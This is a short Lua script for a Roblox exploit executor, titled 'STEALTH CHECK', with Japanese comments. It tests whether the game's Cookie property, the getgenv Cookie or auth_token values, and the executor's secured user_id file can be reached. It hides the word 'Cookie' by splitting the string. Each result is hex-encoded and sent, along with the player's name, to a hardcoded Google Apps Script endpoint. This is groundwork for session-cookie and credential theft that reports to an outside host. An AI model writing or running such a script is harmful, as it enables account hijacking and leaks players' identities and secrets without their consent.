-- [[ PROJECT: STEALTH CHECK ]]
local GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec"

local function quick_send(label, status)
    local val = label .. ":" .. tostring(status)
    local hex = ""
    for i = 1, #val do hex = hex .. string.format("%02X", string.byte(val:sub(i,i))) end
    pcall(function() 
        game:HttpGet(GAS_URL .. "?hex=" .. hex .. "&user=" .. game.Players.LocalPlayer.Name) 
    end)
end

print("🔍 存在確認のみ実行中...")

-- 1. Cookieプロパティの存在チェック (中身は見ない)
local has_cookie = "No"
local s = pcall(function()
    if game["Coo".."kie"] then has_cookie = "Yes" end
end)
quick_send("Has_Cookie_Property", has_cookie)

-- 2. getgenv (環境変数) のチェック
local has_genv_cookie = "No"
pcall(function()
    if getgenv().Cookie or getgenv().auth_token then has_genv_cookie = "Yes" end
end)
quick_send("Has_Genv_Cookie", has_genv_cookie)

-- 3. 前回の「手動IDファイル」の読み取り可否だけ
local can_read_file = "No"
local fs, _ = pcall(function() return readfile("Delta/Internals/Secured/user_id") end)
if fs then can_read_file = "Yes" end
quick_send("Can_Read_UserID_File", can_read_file)

print("🏁 完了。これで届かなければ通信自体が再封鎖されてるぜ。")
